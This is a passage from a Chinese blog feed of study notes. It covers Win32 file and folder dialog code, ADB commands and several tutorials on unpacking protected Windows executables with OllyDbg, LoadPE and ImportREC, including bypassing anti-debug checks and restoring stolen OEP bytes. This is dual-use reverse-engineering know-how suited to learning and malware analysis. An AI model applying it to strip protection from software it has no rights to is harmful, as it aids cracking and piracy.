<li>intent.setClass(目前的acitivy.this, 目标activity.class);<br>应该就是这个样子的一个意思，然后我们startActivity就可以了。最后的效果：<br><img src="img1.gif" alt="实现效果"><br>记录一下东西，Ctrl+shift+/这个就可以进行快速注释，Alt+/就可以快速联想。<br>扩展：match_parent:是layout_width和layout_height的属性值之一，表示和父组件一样的长度。<br>这些Activity是以栈的形式在内存中保存的，这个动脑子想一下也就知道了。</li>
</ul>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>通用对话框</title>
    <url>/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/</url>
    <content><![CDATA[<h1 id="通用对话框"><a href="#通用对话框" class="headerlink" title="通用对话框"></a>通用对话框</h1><p>通用对话框其实还是比较常用的，这里主要分为获取文件目录和获取文件夹目录两种对话框形式，并且获取文件目录的对话框还分为打开文件和写入文件两种对话框形式。</p>
<h2 id="获取文件目录"><a href="#获取文件目录" class="headerlink" title="获取文件目录"></a>获取文件目录</h2><p>这个相对而言是比较简单的，主要的牵扯到GetOpenFileName()和GetSaveFileName()这两个函数，这两个函数需要一个同样的参数，这个参数也就是一个OPENFILENAME类型的指针，这个类型在MSDN中的定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOFN</span> &#123;</span> <span class="comment">// ofn </span></span><br><span class="line">    DWORD         lStructSize; </span><br><span class="line">    HWND          hwndOwner; </span><br><span class="line">    HINSTANCE     hInstance; </span><br><span class="line">    LPCTSTR       lpstrFilter; </span><br><span class="line">    LPTSTR        lpstrCustomFilter; </span><br><span class="line">    DWORD         nMaxCustFilter; </span><br><span class="line">    DWORD         nFilterIndex; </span><br><span class="line">    LPTSTR        lpstrFile; </span><br><span class="line">    DWORD         nMaxFile; </span><br><span class="line">    LPTSTR        lpstrFileTitle; </span><br><span class="line">    DWORD         nMaxFileTitle; </span><br><span class="line">    LPCTSTR       lpstrInitialDir; </span><br><span class="line">    LPCTSTR       lpstrTitle; </span><br><span class="line">    DWORD         Flags; </span><br><span class="line">    WORD          nFileOffset; </span><br><span class="line">    WORD          nFileExtension; </span><br><span class="line">    LPCTSTR       lpstrDefExt; </span><br><span class="line">    DWORD         lCustData; </span><br><span class="line">    LPOFNHOOKPROC lpfnHook; </span><br><span class="line">    LPCTSTR       lpTemplateName; </span><br><span class="line">&#125; OPENFILENAME;</span><br></pre></td></tr></table></figure>
<p>这里面比较重要的也就是</p>
<ul>
<li>lpstrFile</li>
<li>nMaxFile</li>
<li>lpstrFilter</li>
<li>nFilterIndex<br>这四个字段比较重要，第一个保存我们文件目录的一个char类型指针变量，NMaxFile应该是一个最大长度的限制，这里我们用MAX_PATH这个就可以了。lpstrFilter这个是过滤器的一个字符串，\0代表一个结束，支持正则，\0\0代表过滤器终止。nFilterIndex过滤器首选第几个。<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例代码：</span></span><br><span class="line">	<span class="keyword">char</span> szFileName[MAX_PATH] = <span class="string">""</span>;</span><br><span class="line">	OPENFILENAME file = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	file.lStructSize = <span class="keyword">sizeof</span>(file);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//设置对话框的属性</span></span><br><span class="line">	file.lpstrFile = szFileName;</span><br><span class="line">	file.nMaxFile = MAX_PATH;</span><br><span class="line">	file.lpstrFilter = <span class="string">"Text Files(*.txt)\0*.txt\0All Files\0*.*\0\0"</span>;<span class="comment">//最后的兩個\0是代表結束</span></span><br><span class="line">	file.nFilterIndex = <span class="number">1</span>; <span class="comment">//這個應該是代表哪個過濾器顯示在第一個得把。</span></span><br><span class="line">	<span class="keyword">if</span> (GetOpenFileName(&amp;file))<span class="comment">//GetSaveFileName這個是用來保存文件的，參數一樣，返回值代表了我們點擊的是不是確定</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,szFileName,<span class="string">"打開的文件"</span>,MB_OK);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
不要忘记导入Windows.h这个头文件，【GetSaveFileName类似】。<h2 id="获取文件夹目录"><a href="#获取文件夹目录" class="headerlink" title="获取文件夹目录"></a>获取文件夹目录</h2>这个就稍微有一点点麻烦，所以我们写一个类，支持我们以后进行编写：<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __DIRDIALOG_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __DIRDIALOG_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ShlObj.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDirDialog</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CDirDialog();</span><br><span class="line">	<span class="function">BOOL <span class="title">DoBrowse</span><span class="params">(HWND hWndParent,LPCTSTR pszTitle = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="function">LPCTSTR <span class="title">GetDirPath</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_szPath;&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	BROWSEINFOA m_bi;</span><br><span class="line">	<span class="comment">//用來接收用戶選擇目錄的緩衝區</span></span><br><span class="line">	<span class="keyword">char</span> m_szPath[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span> m_szDisplay[MAX_PATH];</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&#125;;</span><br><span class="line">CDirDialog::CDirDialog()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;m_bi,<span class="number">0</span>,<span class="keyword">sizeof</span>(m_bi));<span class="comment">//先清空一下這個變量</span></span><br><span class="line">	m_bi.hwndOwner = <span class="literal">NULL</span>;<span class="comment">//對話框父窗口</span></span><br><span class="line">	m_bi.pidlRoot = <span class="literal">NULL</span>;<span class="comment">//用來接收起始目錄的那個結構</span></span><br><span class="line">	m_bi.pszDisplayName = m_szDisplay;<span class="comment">//接受緩衝區的</span></span><br><span class="line">	m_bi.lpszTitle = <span class="literal">NULL</span>;<span class="comment">//對話框中定義的文字</span></span><br><span class="line">	m_bi.ulFlags = BIF_RETURNONLYFSDIRS;<span class="comment">//我們只接受文件系統中的目錄</span></span><br><span class="line">	m_szPath[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CDirDialog::DoBrowse(HWND hWndParent,LPCTSTR pszTitle)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(pszTitle == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		m_bi.lpszTitle = <span class="string">"選擇目標文件夾"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_bi.lpszTitle = pszTitle;</span><br><span class="line">	&#125;</span><br><span class="line">	m_bi.hwndOwner = hWndParent;</span><br><span class="line">	LPITEMIDLIST pItem = SHBrowseForFolder(&amp;m_bi);</span><br><span class="line">	<span class="keyword">if</span> (pItem !=<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		SHGetPathFromIDList(pItem,m_szPath);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__DIRDIALOG_H__結束</span></span></span><br></pre></td></tr></table></figure>
简单说明一下SHGetPathFromIDList这个函数，LPITEMIDLIST这个结构体比较复杂，但是我们通过这个函数我们就可以简单的获取到我们输入的内容。<br>如果我们要用的话呢我们只需要<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CDirDialog.h"</span></span></span><br><span class="line">CDirDialog dir;</span><br><span class="line"><span class="keyword">if</span>(dir.DoBrowse(<span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,dir.GetDirPath(),<span class="string">"打開的文件"</span>,MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这样就可以打开一个文件目录了。</li>
</ul>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>adb-Common-method</title>
    <url>/2020/01/18/adb-Common-method/</url>
    <content><![CDATA[<p>初学Android</p>
<h1 id="ADB常用命令"><a href="#ADB常用命令" class="headerlink" title="ADB常用命令"></a>ADB常用命令</h1><ul>
<li>adb devices<br>这个用于查看当前连接的模拟器。<br><img src="img1.jpg" alt="查看当前连接对象"></li>
<li>adb start-server <strong>开启调试器</strong></li>
<li>adb kill-server  <strong>终止调试器</strong></li>
<li>adb -s 参数 install 路径 <strong>安装一个apk文件</strong> 参数适用于指定安装的路径</li>
<li>adb shell 获取Android的Shell <strong>这个命令有点类似于Linux的命令，且当前目录是我们的根目录</strong><br><img src="img2.jpg" alt="Shell权限"><blockquote>
<p>在这里我刚了解到，原来Android的内核是基于Linux的。<br>exit 退出当前的Shell</p>
</blockquote>
</li>
<li>adb push &lt;Windows的一个文件&gt;&lt;手机文件目录&gt; <strong>主要用来传给我们手机电脑上的一个文件</strong><br>但是如果你遇到：<em>Unable to chmod ***: Read-only file system</em><br>那么解决办法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先我们需要adb切换到root权限：adb remount</span><br><span class="line">然后我们重新挂载：mount -rw -o remount &#x2F;</span><br><span class="line"></span><br><span class="line">	注：</span><br><span class="line">  	mount 是挂载命令</span><br><span class="line">  	-rw  是说指定的挂载文件是可读&#x2F;写的</span><br><span class="line"> 	-o remount &#x2F; 是说重新挂载根</span><br><span class="line">然后我们chmod 777 文件夹</span><br><span class="line">777就是可读可写，具体忘记了，Linux的一些操作过短时间需要复习了看来。</span><br></pre></td></tr></table></figure>
<img src="img3.jpg" alt="重新挂载"><br><img src="img4.jpg" alt="赋予权限"></li>
<li>adb pull &lt;手机文件&gt;&lt;Windows文件路径&gt;</li>
<li>Ctrl+F11横竖屏切换（现在貌似废弃了，在…中有）。</li>
</ul>
<p>上述的许多命令用eclipse基本可以代替，所一这里不过多的赘述。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>NewSectionFindLoseData</title>
    <url>/2020/01/18/NewSectionFindLoseData/</url>
    <content><![CDATA[<h1 id="包含壳的脱壳"><a href="#包含壳的脱壳" class="headerlink" title="包含壳的脱壳"></a>包含壳的脱壳</h1><p>有的时候我们丢失的数据过多，如果我们要找到我们所有丢失的数据基本上是不是太可能的，这个时候我们将壳的一部分包含在程序当中，当不需要做太大的动作的时候，我们的这种做法还是可以的，具体操作如下：</p>
<h2 id="AsProtect找丢失的数据区段"><a href="#AsProtect找丢失的数据区段" class="headerlink" title="AsProtect找丢失的数据区段"></a>AsProtect找丢失的数据区段</h2><p>首先我们先找到我们假的OEP，这个壳子我们还是用最后一次异常法：我们先隐藏OD，其实可以用OD插件的options设置开启自动隐藏（小技巧），这个时候我们设置我们的异常为：<br><img src="img1.jpg" alt="异常设置"><br>然后我们用最后一次异常法（shift+F9），这里一共是27次，在26次的时候我们我们调节我们的异常这个地方我不知道其他人为啥可以，但我就是不可以，我们这个时候将我们的异常调节为：<br><img src="img2.jpg" alt="异常设置"><br>然后我们在最近的一个retn下端，然后执行过去：<br><img src="img3.jpg" alt="retn处"><br>这个时候注意看我在堆栈处的箭头，在这个地方下硬件下硬件写入断点（具体原因只有当时研究的人知道），然后我们的程序会跑到一个jmp处，我们删除硬件写入断点，然后往下跟句，然后我们当前的位置：<br><img src="img4.jpg" alt="适合找数据的位置"><br>塑这个位置使我们比较合适的找数据的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00CC696F    BB A2000000     MOV EBX,0A2</span><br><span class="line">00CC6974    0BDB            OR EBX,EBX</span><br><span class="line">00CC6976    75 07           JNZ SHORT 00CC697F</span><br><span class="line">00CC6978    894424 1C       MOV DWORD PTR SS:[ESP+1C],EAX</span><br><span class="line">00CC697C    61              POPAD</span><br><span class="line">00CC697D    50              PUSH EAX</span><br><span class="line">00CC697E    C3              RETN</span><br><span class="line">00CC697F    E8 00000000     CALL 00CC6984</span><br><span class="line">00CC6984    5D              POP EBP</span><br></pre></td></tr></table></figure>
<p>然后我们用我们的LoadPE进行脱壳：<br>在这里我们先纠正镜像大小，然后完全转存。<br>下面比较重要，注意看我们需要区域转存：<br><img src="img5.jpg" alt="区域转存"><br><img src="img6.jpg" alt="区域转存"><br>注意我们选择的区段要包含我们刚才停留的位置：这个时候我们使用LoadPE给我们的PE编辑器，打开文件，点击编辑区段：<br><img src="img7.jpg" alt="区段编辑"><br><img src="img8.jpg" alt="区段编辑"><br>导入我们刚才的区段。<br><img src="img9.jpg" alt="计算区段"><br>这里我们用我们当前的位置减去我们的基址（也就是400000），得到我们的虚拟地址，然后我们保存一下。<br>这个时候我们重建PE，但在重建之前我们需要设置：<br><img src="img10.jpg" alt="重建PE"><br>只留下验证PE就好了，我们重建确定。</p>
<h2 id="AsProtect找假OEP"><a href="#AsProtect找假OEP" class="headerlink" title="AsProtect找假OEP"></a>AsProtect找假OEP</h2><p>然后我们找我们假的OEP，这个地方我们很简单，我们在我们的code断下内存访问中断，然后我们运行，运行到这个地方：<br><img src="img11.jpg" alt="假OEP"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004F27CF    FF15 9CC25200   CALL DWORD PTR DS:[52C29C]</span><br><span class="line">004F27D5    33D2            XOR EDX,EDX</span><br><span class="line">004F27D7    8AD4            MOV DL,AH</span><br><span class="line">004F27D9    8915 34306900   MOV DWORD PTR DS:[693034],EDX</span><br><span class="line">004F27DF    8BC8            MOV ECX,EAX</span><br><span class="line">004F27E1    81E1 FF000000   AND ECX,0FF</span><br><span class="line">004F27E7    890D 30306900   MOV DWORD PTR DS:[693030],ECX</span><br><span class="line">004F27ED    C1E1 08         SHL ECX,8</span><br><span class="line">004F27F0    03CA            ADD ECX,EDX</span><br><span class="line">004F27F2    890D 2C306900   MOV DWORD PTR DS:[69302C],ECX</span><br></pre></td></tr></table></figure>
<p>我们这个时候重建输入表，import REC我们填写我们的假OEP，然后查找：<br><img src="img12.jpg" alt="重建IAT"><br>我们用等级一修复，还剩下六个，我们用ASProcet的插件进行搜索，最后得到的结果：<br><img src="img13.jpg" alt="重建IAT"><br>我们全部都找到了。<br>我们修改我们的OEP，修改为我们的假OEP地址的相对地址：0x00CC696F-0x00400000=0x008C696F<br><img src="img14.jpg" alt="修改OEP"><br>然后抓取修复就可以了。<br><strong>PS：但在这个地方，我却没有成功，不知道为什么。但是操作确实是这个样子的，可能是OD的版本不同，或者我查看的这个程序是在是太老了的原因，这也算是给自己留下的一个疑惑吧，脱壳学习，先暂停一下，是时候复习一下Win32了！</strong></p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>LoseData-find</title>
    <url>/2020/01/17/LoseData-find/</url>
    <content><![CDATA[<h1 id="丢失的程序头部"><a href="#丢失的程序头部" class="headerlink" title="丢失的程序头部"></a>丢失的程序头部</h1><p>有的程序加壳之后将原本OEP的部分头部给去除掉了，放在了自身的壳里面，导致我们脱壳之后我们的程序可能入口会出错，这个时候我们就需要自己补充上去：</p>
<h2 id="丢失数据的OEP"><a href="#丢失数据的OEP" class="headerlink" title="丢失数据的OEP"></a>丢失数据的OEP</h2><p>首先我们需要找到他给我们的OEP，这里ACProcet这个壳比较特殊，我们需要用插件HideOD进行隐藏，然后将我们的调试选项，取消勾选INT3的异常：<br><img src="img1.jpg" alt="调试设置"><br><img src="img2.jpg" alt="隐藏OD"><br>这个时候我们运行程序，使用最后一次异常，将我们的SE栈值下上硬件断点，这里为什么不下INT3断点呢，其实是这个壳有一定的保护系统，下上会出错（别人说的），然后我们的程序会进入下面这个地方：<br><img src="img3.jpg" alt="关键处"><br>这个时候我们看到RETN就到了我们的假的OEP，这个时候我们运行到RETN，然后对我们的code代码段进行下访问断点：<br><img src="img4.jpg" alt="返回处"><br><img src="img5.jpg" alt="访问中断"><br>这个时候运行程序，我们的程序就会到假的OEP：<br><img src="img6.jpg" alt="丢失数据的OEP"><br>这个时候我们知道之后，其实已经错过了找我们的丢失数据的机会，我们重新来过：<br>在我们下断在RETN的时候我们下12ffc0这个硬件访问断点，<br><img src="img7.jpg" alt="硬件断点"><br>然后他会带我们跳到：<br><img src="img8.jpg" alt="丢失的数据"><br>我们复制二进制数据，然后相同的方法到达我们刚才的OEP，把那一段给粘贴上去：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">55 8B EC 6A FF</span><br></pre></td></tr></table></figure>
<p>我们找到假的OEP其实有个坑，程序代码会混淆，这个时候我们Ctrl+A分析代码就好了，然后在上面5个字节粘贴我们的二进制：<br><img src="img9.jpg" alt="补充数据"><br>这个时候我们将我们当前的EIP进行转到我们的补充好的数据上面，然后进行脱壳：<br><img src="img10.jpg" alt="修改EIP"><br>这个时候我们打开LoadPE，修改我们的镜像，然后拖出来，之后的操作和我们之前的都是一样的（import REC需要修复数据），然后生成我们的脱壳程序。<br>但是我们发现我们的程序还是没办法运行起来。这里别人说应该是保护的一个机制：<br><img src="img11.jpg" alt="启动失败"><br>我们去到我们没有脱壳前程序的OEP，然后将我们的一些丢失数据放回去这个样子他就检测不出来了。<br><img src="img12.jpg" alt="原先OEP"><br>入口的OEP是AC000，我们跳过去，把我们的二进制数据粘贴上去，然后用jmp跳转跳转到我们的真正的OEP：<br><img src="img13.jpg" alt="假OEP"><br>修改完毕之后我们保存（OD自带的保存修改），但是这个时候还是不行，因为我们现在PE头部的OEP还是我们真正的OEP，我们用LoadPE指过去：<br><img src="img14.jpg" alt="修改入口点地址"><br>我们点击保存，确定就好了，但是我们发现我们PEid还是找不到壳子，这个就是后话了。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>OverLay-UnShell</title>
    <url>/2020/01/16/OverLay-UnShell/</url>
    <content><![CDATA[<p>当我们在查壳的时候碰到覆盖（OverLay）的时候，我们就需要如下操作：<br><img src="img10.jpg" alt="查壳"></p>
<h1 id="OverLay数据处理"><a href="#OverLay数据处理" class="headerlink" title="OverLay数据处理"></a>OverLay数据处理</h1><p>今天刚学习了这种数据处理的方法，具体原因之后深入分析，其实也就是区段数据的一个补充，首先需要找到我们的多余数据，分为两种简单方法：</p>
<h2 id="数据查找法"><a href="#数据查找法" class="headerlink" title="数据查找法"></a>数据查找法</h2><p>这种方法比较简单也比较直接，我们从最底部自下往上寻找一大片00，用快捷键就可以了，记住是搜索没有脱壳的数据：<br><img src="img1.jpg" alt="查找方法"><br><img src="img2.jpg" alt="结果数据"><br>我们从00后面的数据复制，最好用shift范围性复制，复制到结尾。<br><img src="img3.jpg" alt="复制数据"></p>
<h2 id="区段查找法"><a href="#区段查找法" class="headerlink" title="区段查找法"></a>区段查找法</h2><p>这个通过LoadPE查找最后的一个区段的范围，然后通过真实的RVA+Size计算出来我们要找的数据：<br><img src="img4.jpg" alt="PE计算"><br>8800+400=8C00，我们这里Ctrl+G进行转到，然后看到和我们刚才一样的地方，同样复制。<br><img src="img5.jpg" alt="地址转到"></p>
<h1 id="修复数据"><a href="#修复数据" class="headerlink" title="修复数据"></a>修复数据</h1><p>复制完毕之后我们打开我们脱壳完毕的程序，然后拖到底部，然后将我们刚才的数据复制上去。<br><img src="img6.jpg" alt="粘贴数据"><br>粘贴上去会询问我们，我们点击确定就好了：<br><img src="img7.jpg" alt="确定"><br>之后我们就会看到数据变成这个样子的：<br><img src="img8.jpg" alt="修改的数据"><br>我们Ctrl+S保存，然后用PEid进行查壳：<br><img src="img9.jpg" alt="查壳"><br>我们发现我们的程序脱壳完毕，并且后面还有一个“[覆盖]”，运行也正常这个样子就算是可以了的。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>IF-UnShell</title>
    <url>/2020/01/16/IF-UnShell/</url>
    <content><![CDATA[<h2 id="快捷判断找OEP"><a href="#快捷判断找OEP" class="headerlink" title="快捷判断找OEP"></a>快捷判断找OEP</h2><p>有的时候我们在脱壳的时候经常其实眼睛观察就能观察到OEP的位置（比较大的一个跨区段跳转），但是这个时候我们的跳转并没有实现，原因有很多，比较典型的原因就是我们的输入表重新构建的工作并没有完成，所以紧跟其后的就是我们的输入表重建工作，比较典型的就是下面这段代码：<br><img src="img1.jpg" alt="关键跳"><br>我们来看这句，这么多字节，很明显的啊，就是一个跨区段的跳转，但是我们发现这个时候我们并没有跳转实现，我们先转过去，发现确实是OEP，但是我们dump修复的时候我们发现我们发现不了任何一个输入表，这就对了，<strong>下面的这一下跳转其实就是我们的输入表重建工作，比较明显的就是我们的我们寄存器中会出现输入表的一些信息</strong>：<br><img src="img2.jpg" alt="关键跳"><br>这个时候我们要注意了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043E633    09C0            or eax,eax                               ; 跑跑排行.0043E746</span><br><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure>
<p>我们可以看到，只有只有在我们的eax的值为0的时候我们的跳转才会实现，这个时候OD提供给了我们一个很强大的功能就是跳转断点，我们设置只有在eax==0的时候才会停下来就好了，具体操作如下：<br><img src="img3.jpg" alt="条件断点"><br>键入我们的条件：eax==0<br><img src="img4.jpg" alt="条件"><br>然后我们运行程序：<br><img src="img5.jpg" alt="断下"><br>这个时候我们跟过去就是我们的OEP了。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>special-UnShell</title>
    <url>/2020/01/16/special-UnShell/</url>
    <content><![CDATA[<h2 id="是否正在调试法"><a href="#是否正在调试法" class="headerlink" title="是否正在调试法"></a>是否正在调试法</h2><p>有的时候一些壳会有防止调试的检测，这个时候我们就可以下：IsDebuggerPresent这个断点，然后返回到用户组，下面应该就有OEP的一些运算了，手下我们先下断点：<br><img src="img1.jpg" alt="下断点"><br>然后我们执行到程序领空：<br>我们看到了下面这几句话：<br><img src="img2.jpg" alt="OEP计算"><br>这个时候我们执行完这两句，我们看edi的值：<br><img src="img3.jpg" alt="EDI"><br>这个时候我们转到EDI的这个地址：<br><img src="img4.jpg" alt="OEP"><br>这个时候F4运行到就好了！</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>track API</title>
    <url>/2020/01/16/track-API/</url>
    <content><![CDATA[<h2 id="一个文件修复"><a href="#一个文件修复" class="headerlink" title="一个文件修复"></a>一个文件修复</h2><p>import REC跟踪无效的函数，这样我们才能够准确无误的删除一些真正无效的函数，我们首先先找到程序的OEP，这里最后一次异常法就可以到达：<br><img src="img1.jpg" alt="OEP"><br>这个时候我们dump出来，运行的时候发现：<br><img src="img2.jpg" alt="错误"><br>这个时候我们用import REC进行修复，常规操作，我们转储的文件中，但是我们发现还是会出来相同的问题，那么我们该如何办呢？</p>
<h2 id="跟踪出真正的函数地址"><a href="#跟踪出真正的函数地址" class="headerlink" title="跟踪出真正的函数地址"></a>跟踪出真正的函数地址</h2><p>我们首先搜索出函数的输入表（这里验证过了）：<br>然后我们显示出无效的函数：<br><img src="img3.jpg" alt="无效函数"><br>这个时候我们不要急着去删除他，我们先右键跟踪这几个函数地址，看看能不能跟踪出真正的函数地址：<br><img src="img4.jpg" alt="跟踪函数"><br>然后挨个尝试，发现第一二个都是无法看到的，但是我们用到第三个的时候，我们发现import REC卡死了，这个时候，我们就需要打开新的需要脱壳的程序，然后重新加载，然后我们跟踪函数，和上面的操作一样，这个时候import REC会给我们一个结果：<br><img src="img5.jpg" alt="跟踪结果"><br>我们可以看到import REC给了我们结果，不仅给了我们地址，还给了我们的函数名，但是不知道是不是bug，我在跟踪的时候待脱壳程序自动关闭了，但是这个不影响，然后我们发现还有5个无法修复，那么没办法我们尝试着去删除他们（在这里有个坑，不知道是不是这个程序的bug，我们点击删除不行，只能点击那个剪切），完事之后我们修复抓取文件，导出就会发现程序脱壳完毕了：<br><img src="img6.jpg" alt="脱壳完毕"></p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Rebuilt input list2</title>
    <url>/2020/01/16/Rebuilt-input-list2/</url>
    <content><![CDATA[<p>今天记录一下，再重新构建PE表的时候出现问题实时的解决办法，这是一个EZIP的壳，我们很简单的就到了我们的OEP：<br><img src="img1.jpg" alt="OEP"><br>然后我们进行dump文件，首先我们用OD自带的插件进行dump。<br>然后运行dump出来的文件，会出现出错的问题：<br><img src="img2.jpg" alt="错误"><br>解决办法如下：</p>
<h2 id="LoadPE纠正镜像"><a href="#LoadPE纠正镜像" class="headerlink" title="LoadPE纠正镜像"></a>LoadPE纠正镜像</h2><p><img src="img3.jpg" alt="纠正镜像"></p>
<h2 id="import-REC修复转储文件"><a href="#import-REC修复转储文件" class="headerlink" title="import REC修复转储文件"></a>import REC修复转储文件</h2><p>我们可以看到import REC已经正确的查找到了我们需要的东西<br><img src="img4.jpg" alt="修复转储文件"><br>我们接下来获取输入表，剪切输入表dump出来就好了。<br>但是我们发现我们又一次的出现之前的错误！<br><img src="img5.jpg" alt="再次出现错误"></p>
<h2 id="LoadPE重构PE结构"><a href="#LoadPE重构PE结构" class="headerlink" title="LoadPE重构PE结构"></a>LoadPE重构PE结构</h2><p>我们用LoadPE重新构建一下PE的结构，<br><img src="img6.jpg" alt="选择重建PE"><br>然后我们点击打开，会出现这样子的一个窗口：<br><img src="img7.jpg" alt="查看成功"><br>这个时候我们的程序就正常运行起来了。<br>并且壳子也就没有了，其实我们一开始不用OD自带的插件脱壳，用LoadPE去拖这个壳子，import REC去修复是遇不到这个问题的。</p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Common-Unshell2</title>
    <url>/2020/01/14/Common-Unshell2/</url>
    <content><![CDATA[<h1 id="比较常用的脱壳技巧2"><a href="#比较常用的脱壳技巧2" class="headerlink" title="比较常用的脱壳技巧2"></a>比较常用的脱壳技巧2</h1><p>之前文章介绍了一些比较常见的，下面再介绍几种</p>
<h2 id="VirtualFree法1"><a href="#VirtualFree法1" class="headerlink" title="VirtualFree法1"></a>VirtualFree法1</h2><p>这种方法首先是下VirtualFree的断点，执行到我们的用户组代码，然后搜索push 8000，之后我们就往下跟踪，然后大跳转跟过去，一般就到了我们的OEP，具体操作看截图：<br>首先下端之后运行，然后回到我们的程序领空。<br><img src="img1.jpg" alt="从VirtualFree回到程序"><br>然后接下来我们搜索push 8000，进行下断。<br><img src="img2.jpg" alt="在push 8000下断"><br>最后就来到了我们的OEP</p>
<h2 id="VirtualFree法2"><a href="#VirtualFree法2" class="headerlink" title="VirtualFree法2"></a>VirtualFree法2</h2><p>这个更加简单，我们下VirtualFree的断点，然后执行两次，意思就是在第二次断在VirtualFree的时候我们返回到程序领空，继续单步就好了。</p>
<h2 id="mov转移法"><a href="#mov转移法" class="headerlink" title="mov转移法"></a>mov转移法</h2><p>就是说当我们刚进入程序的时候，如果首句出现mov指令的时候，我们给他后面的地址下断点，例如：<br><img src="img3.jpg" alt="查看数据"><br>然后运行，跟下去就好了<br>但在这里我们看到一个函数片段，也就是有一个retn，我们在片段下方进行下断：<br><img src="img4.jpg" alt="下断"><br>然后运行，继续往下跟踪，就到了OEP。</p>
<h2 id="VirtualAlloc法"><a href="#VirtualAlloc法" class="headerlink" title="VirtualAlloc法"></a>VirtualAlloc法</h2><p>这个法子和VirtualFree法2基本没差别，一个操作方法，无非下的函数变了，但是后面跟踪的会有点长。</p>
<h2 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h2><p>首先我们先将OD中的所有异常全取消掉，然后重新载入程序，操作如下：<br><img src="img5.jpg" alt="设置OD"><br>然后我们运行程序，程序会中断，直到我们运行N次之后，程序顺利跑起来了，那我们再次重新运行，然后运行N-1次，查看SE（异常）处理器在堆栈中记录的地址：<br><img src="img6.jpg" alt="SE处理器地址"><br>然后转到这个地址，接下来的操作和我们的mov转移法相同了。（不要忘记调节回去哦！）</p>
<h2 id="at-GetVersion"><a href="#at-GetVersion" class="headerlink" title="at GetVersion"></a>at GetVersion</h2><p>程序就会运行到GetVersion，然后我们在段尾下端，然后返回去，发现你发现你现在就在OEP下方，嘻嘻。<br><img src="img7.jpg" alt="OEP附近"></p>
]]></content>
      <categories>
        <category>脱壳分析</category>
      </categories>
      <tags>
        <tag>脱壳分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Rebuilt input list</title>
    <url>/2020/01/14/Rebuilt-input-list/</url>
